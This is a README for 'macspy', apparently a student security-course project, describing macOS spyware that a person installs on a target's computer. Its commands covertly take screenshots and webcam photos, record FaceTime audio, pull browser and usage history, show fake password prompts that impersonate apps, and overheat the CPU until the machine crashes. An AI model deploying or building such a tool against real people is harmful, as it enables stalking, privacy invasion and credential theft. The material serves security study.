# macspy
COMP6841 20T1 Something Awesome Project

## Setup:
Copy the folder "target" onto the target's computer, open a terminal in that directry and type python3 install.py. You can delete the folder afterwards.
The software will now always be running while the target is logged into their machine.

## How to use:
Open terminal and make sure you are in the same directoy as all the files in admin. Type python3 admin.py.
If macspy.py is running, you will be notified when it connects. Then you can start sending commands and receiving data.
Files received will be sent to the same directory as the program files are in.

Arguments in square brackets [] are optional.

### Screenshot
```
screenshot [--interval] weekday(mon|tues|wed|thurs|fri|sat|sun) startTime(HH:MM) endTime(HH:MM) [--frequency] HH:MM:SS
```
Take a screenshot of the target's screen. There is the option to specfy both interval and frequency. Whereby a screenshot will be taken at startTime, followed by another screenshot at every interval specified by frequency, until endTime is reached.
Times must be in 24h format.

### Webcam
```
webcam [--time] weekday(mon|tues|wed|thurs|fri|sat|sun) time(HH:MM)
```
Take a photo with the target's webcam. If [--time] is specified, the photo will be taken at the next day and time that matches it.

### Record facetime calls
The audio of the target's facetime calls will be recorded using the inbuilt mic. This happens automatically.

### Get browser history
```
browserhistory
```
Sent as csv files.

### Computer usage history
```
usageintervals
```
See all the times in the past week they were logged into and active on their computer. Will be sent as a simple .txt file that lists all these intervals. To see them in nice graphical form, run the script plot.py <filename> where filename is the name of the usage interval file.

### Phish for their password
```
phishpassword [--app] appname [--message] phishing message
```
Prompts the target to enter their password. This will be a box that pops up showing the icon of an app and a message. Can specifiy which app the prompt says it comes from and what message to display. Otherwise, the default ones are used.

### Jetplane
```
jetplane [--altitude] degC [--crash]
```
Causes the target's CPUs to heat up and the fans to spin. The CPUs will stay around the temperature specified by --altitude. If --crash is selected, the heating and fanning will be unregulated and will result in a turbulent on-screen experience which will continue until a crash or the computer is forcibly shut down by the user.
Note: --altitude option is only suppored once phishpassword has been successful. 

### Uninstall
```
uninstall
```
Removes the software and associated data from the target's computer.
